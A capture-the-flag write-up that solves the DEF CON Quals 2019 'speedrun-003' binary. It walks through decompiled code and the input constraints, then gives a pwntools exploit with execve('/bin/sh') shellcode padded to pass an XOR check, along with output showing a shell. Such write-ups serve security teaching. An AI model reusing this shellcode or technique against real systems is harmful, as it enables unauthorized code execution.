# Defcon Quals 2019 Speedrun---03

Full disclosure, I did not solve this durring the competition (I was not fast enough sadly). However I solved it after the competition and this is how I did it.

First let's take a look at the binary:
```
$	pwn checksec speedrun
[*] '/Hackery/defcon/s3/speedrun'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$	file speedrun
speedrun: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=6169e4b9b9e1600c79683474c0488c8319fc90cb, not stripped
$	./speedrun
Think you can drift?
Send me your drift
19535728
You're not ready.
```

So we can see that it has all of the standard binary mitiations, and that it is a 64 bit elf that prompts us for input. When we look at the main function in IDA, we see this.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi@1

  setvbuf(_bss_start, 0LL, 2, 0LL);
  v3 = "DEBUG";
  if ( !getenv("DEBUG") )
  {
    v3 = (const char *)5;
    alarm(5u);
  }
  say_hello(v3, 0LL);
  get_that_shellcode();
  return 0;
}
```

Looking through the functions, the one of interest to us is `get_that_shellcode()`:

```
__int64 get_that_shellcode()
{
  int v0; // ST0C_4@1
  char v1; // ST0A_1@7
  char buf; // [sp+10h] [bp-30h]@1
  char v4; // [sp+1Fh] [bp-21h]@7
  char v5; // [sp+2Eh] [bp-12h]@1
  __int64 v6; // [sp+38h] [bp-8h]@1

  v6 = *MK_FP(__FS__, 40LL);
  puts("Send me your drift");
  v0 = read(0, &buf, 0x1EuLL);
  v5 = 0;
  if ( v0 == 30 )
  {
    if ( strlen(&buf) == 30 )
    {
      if ( strchr(&buf, 0x90) )
      {
        puts("Sleeping on the job, you're not ready.");
      }
      else
      {
        v1 = xor((__int64)&buf, 0xFu);
        if ( v1 == (unsigned __int8)xor((__int64)&v4, 0xFu) )
          shellcode_it(&buf, 0x1Eu);
        else
          puts("This is a special race, come back with better.");
      }
    }
    else
    {
      puts("You're not up to regulation.");
    }
  }
  else
  {
    puts("You're not ready.");
  }
  return *MK_FP(__FS__, 40LL) ^ v6;
}
```

Here we can see it scans in `0x1e` bytes worth of input into `buf`, which then `strlen` is called on it. If the output of strlen is `30` then we can proceed. It also checks for NOPS (opcode `0x90`) in our input with `strchr`. Then runs the first half and second half of our input through the `xor` function, and checks to see if the results are the same. The `xor` function just goes through and xors the first `x` number of bytes it has been given, where `x` is the second argument and returns the output as a single byte:

```
__int64 __fastcall xor(__int64 input, unsigned int x)
{
  unsigned __int8 y; // [sp+17h] [bp-5h]@1
  unsigned int i; // [sp+18h] [bp-4h]@1

  y = 0;
  for ( i = 0; i < x; ++i )
    y ^= *(_BYTE *)(i + input);
  return y;
}
```

So in order for our shellcode to run, the first half of our shellcode when all the bytes are xored together must be equal to the second half of the shellcode xored togther. Then if it passes that check, our input is ran as shellcode in the `shellcode_it` function:

```
int __fastcall shellcode_it(const void *shellcode, unsigned int bytes)
{
  unsigned int len; // ST04_4@1
  int (__fastcall *v3)(void *, const void *); // rax@1
  int (__fastcall *dest)(void *, const void *); // ST10_8@1
  const void *v5; // rsi@1
  int (__fastcall *v6)(void *, const void *); // rdi@1

  len = bytes;
  v3 = (int (__fastcall *)(void *, const void *))mmap(0LL, bytes, 7, 34, -1, 0LL);
  dest = v3;
  v5 = shellcode;
  v6 = v3;
  memcpy(v3, v5, len);
  return dest(v6, v5);
}
```

So in order to get a shell, we will just need to send it a `30` byte shellcode with no null bytes (because that would interfere with the `strlen` call), and the first half of the shellcode xored together will be equal to the second half of the shellcode xored together. For this I used a 24 byte shellcode that I have used previously, while padding the end with `6` bytes worth of data to pass the length check. I then edited the last byte to pass the xor check by doing some simple xor math. Also I didn't have to worry too much about what instructions the opcodes mapped to, since the would be executed after the syscall which is when we get the shell.

Putting it all together, we get the following exploit:
```
from pwn import *

# Establish the target process
target = process('./speedrun-003')
#gdb.attach(target, gdbscript = 'pie b *0xac7')
#gdb.attach(target, gdbscript = 'pie b *0xaa3')
#gdb.attach(target, gdbscript = 'pie b *0x982')
#gdb.attach(target, gdbscript = 'pie b *0x9f7')

# The main portion of the shellcode
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"


# Pad the shellcode to meet the length / xor requirements
#shellcode = "\x50"*3 + shellcode + "\x50"*2 + "\x07"
shellcode = shellcode + "\x50"*5 + "\x07"

# Send the shellcode and then drop to an interactive shell
target.send(shellcode)
target.interactive()
```

When we run it:
```
$	python exploit.py 
[+] Starting local process './speedrun-003': pid 17506
[*] Switching to interactive mode
Think you can drift?
Send me your drift
$ w
 23:08:40 up  4:11,  1 user,  load average: 1.30, 0.96, 1.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               18:58   ?xdm?  24:17   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
core  exploit.py  readme.md  speedrun-003
```

Just like that, we solved the challenge!
